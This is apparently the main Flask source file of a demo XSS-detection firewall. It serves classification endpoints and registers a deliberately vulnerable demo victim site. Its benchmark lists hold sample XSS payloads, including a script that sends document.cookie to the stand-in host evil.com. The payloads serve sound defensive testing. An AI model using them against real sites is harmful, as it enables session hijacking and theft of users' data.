"""
GNN-DQN-MAFS XSS Firewall - Windows Server Demo
=================================================
Interactive web application for real-time XSS detection.
Open in browser: http://localhost:5000

Usage:
    conda activate XSS_GNN_DQN
    python app.py
"""

from flask import Flask, request, jsonify, render_template
from datetime import datetime
import sys
import os
import time

# Setup paths — bundled deps (data/, config/) live inside SCRIPT_DIR so the app is self-contained
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SCRIPT_DIR)

# Import detection engine + MAFS + adapter from local firewall_service
from firewall_service import (
    detect_xss,
    detect_xss_patterns,
    load_model,
    MODEL,
    XSS_PATTERNS,
)
import firewall_service as fws  # for live access to MAFS / ADAPTER after load_model()

app = Flask(__name__)

# ── Session State ──
detection_history = []

# Register the vulnerable demo target at /victim/*  (imported after `app` and
# after `detection_history` so victim_site._log_to_dashboard can import them)
from victim_site import victim_bp  # noqa: E402
app.register_blueprint(victim_bp)
session_stats = {
    'total_checks': 0,
    'blocked': 0,
    'safe': 0,
    'start_time': datetime.now()
}


# ══════════════════════════════════════════════════════════════════
# Web Pages
# ══════════════════════════════════════════════════════════════════

@app.route('/')
def index():
    """Main page - serves the interactive detection UI."""
    return render_template('index.html')


# ══════════════════════════════════════════════════════════════════
# API Endpoints
# ══════════════════════════════════════════════════════════════════

@app.route('/api/check', methods=['POST'])
def api_check():
    """Check a single text input for XSS."""
    data = request.get_json() or {}
    text = data.get('text', '').strip()

    if not text:
        return jsonify({'error': 'No text provided'}), 400

    start = time.time()
    result = detect_xss(text)
    elapsed_ms = (time.time() - start) * 1000

    # Add to history
    entry = {
        'input_preview': text[:80] + '...' if len(text) > 80 else text,
        'is_xss': result['is_xss'],
        'score': result['score'],
        'risk_level': result['risk_level'],
        'method': result['method'],
        'patterns': result['patterns'],
        'pattern_score': result['pattern_score'],
        'ml_score': result['ml_score'],
        'elapsed_ms': round(elapsed_ms, 1),
        'timestamp': datetime.now().isoformat()
    }

    detection_history.insert(0, entry)
    if len(detection_history) > 100:
        detection_history.pop()

    # Update stats
    session_stats['total_checks'] += 1
    if result['is_xss']:
        session_stats['blocked'] += 1
    else:
        session_stats['safe'] += 1

    return jsonify(entry)


@app.route('/api/stats', methods=['GET'])
def api_stats():
    """Get session statistics."""
    total = session_stats['total_checks']
    uptime = datetime.now() - session_stats['start_time']
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)

    return jsonify({
        'total_checks': total,
        'blocked': session_stats['blocked'],
        'safe': session_stats['safe'],
        'block_rate': round(session_stats['blocked'] / total * 100, 1) if total > 0 else 0,
        'model_loaded': MODEL is not None,
        'detection_method': 'hybrid' if MODEL else 'pattern',
        'pattern_count': len(XSS_PATTERNS),
        'uptime': f'{hours:02d}:{minutes:02d}:{seconds:02d}'
    })


@app.route('/api/history', methods=['GET'])
def api_history():
    """Get recent detection history."""
    return jsonify({'history': detection_history[:50]})


@app.route('/api/health', methods=['GET'])
def api_health():
    """Health check."""
    return jsonify({
        'status': 'healthy',
        'model_loaded': MODEL is not None,
        'patterns': len(XSS_PATTERNS)
    })


@app.route('/api/batch-demo', methods=['POST'])
def api_batch_demo():
    """Run a demo suite of 10 test cases."""
    demo_payloads = [
        {"text": "Hello World, welcome to our website", "type": "safe"},
        {"text": "Search for Python tutorials", "type": "safe"},
        {"text": "Contact email: user@example.com", "type": "safe"},
        {"text": "Order #12345 shipped successfully", "type": "safe"},
        {"text": "Version 3.2.1 released", "type": "safe"},
        {"text": "<script>alert('XSS')</script>", "type": "xss"},
        {"text": "<script>document.location='http://evil.com/?c='+document.cookie</script>", "type": "xss"},
        {"text": "<img src=x onerror=alert(1)>", "type": "xss"},
        {"text": "<svg onload=alert('XSS')>", "type": "xss"},
        {"text": "eval(atob('YWxlcnQoMSk='))", "type": "xss"},
    ]

    results = []
    for payload in demo_payloads:
        start = time.time()
        result = detect_xss(payload['text'])
        elapsed_ms = (time.time() - start) * 1000

        entry = {
            'input_preview': payload['text'][:80],
            'is_xss': result['is_xss'],
            'score': result['score'],
            'risk_level': result['risk_level'],
            'method': result['method'],
            'patterns': result['patterns'],
            'pattern_score': result['pattern_score'],
            'ml_score': result['ml_score'],
            'elapsed_ms': round(elapsed_ms, 1),
            'timestamp': datetime.now().isoformat()
        }

        detection_history.insert(0, entry)
        session_stats['total_checks'] += 1
        if result['is_xss']:
            session_stats['blocked'] += 1
        else:
            session_stats['safe'] += 1

        results.append(entry)

    if len(detection_history) > 100:
        del detection_history[100:]

    return jsonify({'results': results, 'count': len(results)})


# ══════════════════════════════════════════════════════════════════
# MAFS Multi-Agent + Online Adaptation Endpoints
# ══════════════════════════════════════════════════════════════════

@app.route('/api/agents-verdict', methods=['POST'])
def api_agents_verdict():
    """Run the MAFS pipeline + adaptive observer for one input string."""
    if fws.MAFS is None:
        return jsonify({'error': 'MAFS ensemble not loaded'}), 503

    data = request.get_json(silent=True) or {}
    text = (data.get('text') or '').strip()
    if not text:
        return jsonify({'error': 'Field "text" is required'}), 400

    try:
        prediction = fws.MAFS.predict(text)
    except Exception as e:
        return jsonify({'error': f'MAFS predict failed: {e}'}), 500

    adapter_event = None
    if fws.ADAPTER is not None:
        try:
            adapter_event = fws.ADAPTER.observe(text, prediction)
        except Exception:
            adapter_event = None

    patt = detect_xss_patterns(text)

    return jsonify({
        'text':            text[:300],
        'mafs':            prediction,
        'adapter_event':   adapter_event,
        'regex_baseline':  {
            'is_xss':  patt['is_xss'],
            'score':   patt['score'],
            'matches': [p['name'] for p in patt['patterns'][:8]],
        },
    })


@app.route('/api/adapter-state', methods=['GET'])
def api_adapter_state():
    if fws.ADAPTER is None:
        return jsonify({'error': 'Adapter not active'}), 503
    return jsonify(fws.ADAPTER.state())


@app.route('/api/mafs-info', methods=['GET'])
def api_mafs_info():
    if fws.MAFS is None:
        return jsonify({'error': 'MAFS not loaded'}), 503

    agents = []
    for i, slice_idx in enumerate(fws.MAFS.agent_slices):
        kept = [idx for idx in slice_idx if idx in fws.MAFS._selected_set]
        agents.append({
            'agent_id':     i,
            'slice_start':  slice_idx[0],
            'slice_end':    slice_idx[-1],
            'slice_size':   len(slice_idx),
            'kept_count':   len(kept),
            'drop_count':   len(slice_idx) - len(kept),
            'keep_rate':    round(len(kept) / max(len(slice_idx), 1), 4),
        })

    return jsonify({
        'num_agents':         fws.MAFS.NUM_AGENTS,
        'features_per_agent': fws.MAFS.features_per_agent,
        'features_total':     fws.MAFS.total_features,
        'selected_total':     len(fws.MAFS.selected_indices),
        'agents':             agents,
    })


@app.route('/api/diversity-benchmark', methods=['GET'])
def api_diversity_benchmark():
    """Run a fixed benchmark set through MAFS, return per-agent activations for the diversity heatmap."""
    if fws.MAFS is None:
        return jsonify({'error': 'MAFS not loaded'}), 503

    benchmark = [
        ('Benign',        'hello world how are you today'),
        ('Script',        '<script>alert(1)</script>'),
        ('Event handler', '<img src=x onerror=alert(1)>'),
        ('JS URL',        '<a href="javascript:alert(1)">click</a>'),
        ('SVG',           '<svg onload=alert(1)>'),
        ('Encoded',       '%3Cscript%3Ealert(1)%3C/script%3E'),
        ('Polyglot',      "jaVaScRipT:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1))//"),
        ('DOM-based',     "<input onfocus=eval('alert(1)') autofocus>"),
    ]

    rows = []
    for label, payload in benchmark:
        try:
            r = fws.MAFS.predict(payload)
            rows.append({
                'label':        label,
                'payload':      payload,
                'score':        r['score'],
                'is_xss':       r['is_xss'],
                'active_votes': r['active_votes'],
                'agent_active': [a['active_count'] for a in r['agents']],
                'agent_score':  [a['activation_score'] for a in r['agents']],
            })
        except Exception:
            pass

    return jsonify({'benchmark': rows})


# ══════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    load_model()
    print("=" * 60)
    print("  GNN-DQN-MAFS XSS Detection - Windows Demo")
    print("=" * 60)
    print(f"  Model loaded: {MODEL is not None}")
    print(f"  Detection patterns: {len(XSS_PATTERNS)}")
    print(f"  Open in browser: http://localhost:5000")
    print("=" * 60)

    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
